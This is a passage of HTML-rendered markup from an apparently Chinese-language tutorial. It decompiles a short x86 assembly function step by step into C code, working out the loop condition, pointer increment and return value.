&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leave                       &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret                         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;判断入口：&lt;/p&gt;
&lt;p&gt;我们寻找一个连续的判断指令和一个跳转指令，我们可以找到 cmp 和 jge 这两个连续指令，就说明这里是判断入口。&lt;/p&gt;
&lt;p&gt;循环：&lt;/p&gt;
&lt;p&gt;我们看到，最后存在一个jmp命令，jmp命令指向了第foo+12的位置，因此foo+12就是循环的判断条件。&lt;/p&gt;
&lt;p&gt;判断条件：&lt;/p&gt;
&lt;p&gt;判断条件的第一句是 &lt;code&gt;mov -0x4(%ebp), %eax&lt;/code&gt;  ，其中 &lt;code&gt;-0x4(%ebp)&lt;/code&gt; 是最后一个局部变量，由于我们只有一个局部变量 i ，因此这句话的意思是，将本地变量i的值赋值给 eax。&lt;/p&gt;
&lt;p&gt;我们看到cmp的命令是：&lt;code&gt;cmp 0x10(%ebp), %eax&lt;/code&gt; ，其中&lt;code&gt;cmp 0x10(%ebp)&lt;/code&gt; 指第三个入参的值。这句话的意思是计算 eax 寄存器中减去第一个入参的数值，也就是c。&lt;/p&gt;
&lt;p&gt;联合起来，我们就知道，这里是计算 i - c的值，并交给 jge 来做跳转。&lt;/p&gt;
&lt;p&gt;由于汇编的条件判断和C语言条件判断是反过来的，汇编是满足判断则跳过循环体，而C语言是满足条件则执行循环体，因此我们的判断条件也是反过来的。&lt;/p&gt;
&lt;p&gt;jge表示大于等于0则跳过循环体，因此C语言的循环条件是小于0则执行循环体，也就是判断 i - c 是否小于 0&lt;/p&gt;
&lt;p&gt;因此我们可以继续完善我们的代码:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;解析剩余代码片段&#34;&gt;解析剩余代码片段
&lt;/h1&gt;&lt;p&gt;首先标记下已经处理过的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;push &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp                   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;无用&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;无用&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sub &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;esp              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;分配了几个局部变量&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp)        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;判断条件开始&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;判断内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jge &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;判断条件结束&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lea &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;循环结束&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax              &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leave                       &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret                         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;循环体之前的代码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们看一下循环开始之前的部分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp)        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现这两句都涉及到了 eax 寄存器&lt;/p&gt;
&lt;p&gt;对于多条涉及eax 寄存器的操作，我们尽量当作一个整体来看&lt;/p&gt;
&lt;p&gt;我们发现，其实这里就是将 &lt;code&gt;0x8(%ebp)&lt;/code&gt;  的数值 赋值给了 &lt;code&gt;-0x4(%ebp)&lt;/code&gt; ，这两个值分别是 a 和 i&lt;/p&gt;
&lt;p&gt;因此这个部分的代码是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;循环体中间的代码&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lea &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;ebp), &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;incl (&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax)                 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;foo&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对于涉及eax的多条指令，我们不要一条一条看，而是看作一个整体。&lt;/p&gt;
&lt;p&gt;其中，&lt;code&gt;mov 0xc(%ebp), %eax&lt;/code&gt;  和 &lt;code&gt;incl (%eax)&lt;/code&gt;  可以看作 &lt;code&gt;incl (%b)&lt;/code&gt; 注意，由于这里是间接寻址，因此，这意味着，b中存的是地址。因此我们需要修改我们的入参，b这里不是数值，而是地址。这句代码意味着&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b)&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;*b++&lt;/code&gt; 会先对 &lt;code&gt;*b&lt;/code&gt; 解引用，再对 &lt;code&gt;b&lt;/code&gt; 自增&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;因此这里括号不能省略，否则会有问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而对于 &lt;code&gt;lea -0x4(%ebp), %eax&lt;/code&gt;  和 &lt;code&gt;incl (%eax)&lt;/code&gt; ，可以看作 &lt;code&gt;incl (&amp;amp;i)&lt;/code&gt; ，这里继续是间接寻址，也就是对后者地址上的数值自增。这句代码意味着 &lt;code&gt;*(&amp;amp;i)++&lt;/code&gt; ，可以简化为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之所以这么复杂，是因为汇编指令不能直接对地址进行自增操作，但是可以对一个包含地址的寄存器做自增操作。&lt;/p&gt;
&lt;p&gt;因此，补充了剩余的代码片段，代码应该为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b)&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;识别返回数据&#34;&gt;识别返回数据
&lt;/h1&gt;&lt;p&gt;按照C语言的x86的&lt;a class=&#34;link&#34; href=&#34;craftdocs://open?blockId=742A9A8D-28C1-462B-A1D8-2D6CDB66B3BA&amp;amp;spaceId=c5e6e898-910c-6f27-fbc5-91f4c34a9511&#34; &gt;调用约定&lt;/a&gt;，返回数据放在eax中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mov &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;eax
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很显然，这里直接返回了0&lt;/p&gt;
&lt;h1 id=&#34;最终代码&#34;&gt;最终代码
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b)&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
